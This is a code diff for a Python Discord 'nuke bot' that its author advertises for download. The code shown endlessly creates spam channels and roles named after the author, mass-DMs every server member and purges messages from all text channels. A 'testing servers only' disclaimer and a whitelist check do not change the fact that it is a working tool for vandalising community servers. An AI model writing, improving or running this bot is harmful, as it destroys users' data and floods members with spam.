@@ -1,18 +1,35 @@
+"""Discord Nuke Bot Ultimate, developed by ACPlayGames.
+If support is required, join my Discord server: discord.gg/ka35JqY
+Do not use this bot to nuke other servers. Only testing servers are allowed.
+This video was intended to demonstrate the power of coding."""
+
 import discord
 from discord.ext import commands
 from discord import Permissions
 import string
 import random
 
-client = commands.Bot(command_prefix='.')
+client = commands.Bot(
+    command_prefix='.',
+    case_insensitive=True
+)
 
 
 def allowed(ctx):
+    """A custom check to make sure other people are not able to use the code.
+    The first line only checks for one user.
+    If multiple users are whitelisted, then use the second line."""
     return ctx.author.id == ID  # replace ID with whitelisted user ID
+    return ctx.author.id in [
+        ID,
+        ID,
+        ID
+   ]  # replace ID with whitelisted users ID
 
 
 @client.event
 async def on_ready():
+    """Tells what the bot to do when it is ready."""
     await client.change_presence(
         status=discord.Status.dnd,
         activity=discord.Game('Nuking Servers Ultimate')
@@ -25,6 +42,7 @@ async def on_ready():
 
 @client.event
 async def on_command_error(ctx, error):
+    """Checks for any command errors."""
     if isinstance(error, commands.MissingPermissions):  # has_permissions()
         await ctx.send('🚫 **Permission Denied!**')
     if isinstance(error, commands.NotOwner):  # is_owner()
@@ -78,11 +96,9 @@ async def channel(ctx, choice):
             return m.content == 'stop' and m.author == ctx.author
 
         async def spam_create_channels():
-            i = 0
             while True:
-                await ctx.guild.create_text_channel(f'Spam-Text-Channel{i}')
-                await ctx.guild.create_voice_channel(f'Spam-Voice-Channel{i}')
-                i += 1
+                await ctx.guild.create_text_channel('Sub-To-ACPlayGames')
+                await ctx.guild.create_voice_channel('Sub-To-ACPlayGames')
 
         spam_channel_task = client.loop.create_task(spam_create_channels())
         await client.wait_for('message', check=check_reply)
@@ -115,11 +131,9 @@ async def dm(ctx, *, msg=None):
         for member in ctx.guild.members:
             if member != ctx.guild.me:
                 try:
-                    if member.dm_channel is not None:
-                        await member.dm_channel.send(msg)
-                    else:
+                    if member.dm_channel is None:
                         await member.create_dm()
-                        await member.dm_channel.send(msg)
+                    await member.dm_channel.send(msg)
                 except discord.Forbidden:
                     continue
             else:
@@ -162,7 +176,9 @@ async def nickname(ctx):
 @client.command()
 @commands.check(allowed)
 async def purge(ctx):
-    """Deletes all messages from all channels."""
+    """Deletes all messages from all channels.
+    NOTE: Only deletes 100 messages at a time.
+    That is not at least 14 days old."""
     for tc in ctx.guild.text_channels:
         await tc.purge(bulk=True)
 
@@ -179,10 +195,8 @@ async def role(ctx, choice):
             return m.content == 'stop' and m.author == ctx.author
 
         async def spam_create_roles():
-            i = 0
             while True:
-                await ctx.guild.create_role(name=f'Spam Role {i}')
-                i += 1
+                await ctx.guild.create_role(name='Sub-To-ACPlayGames')
 
         spam_role_task = client.loop.create_task(spam_create_roles())
         await client.wait_for('message', check=check_reply)
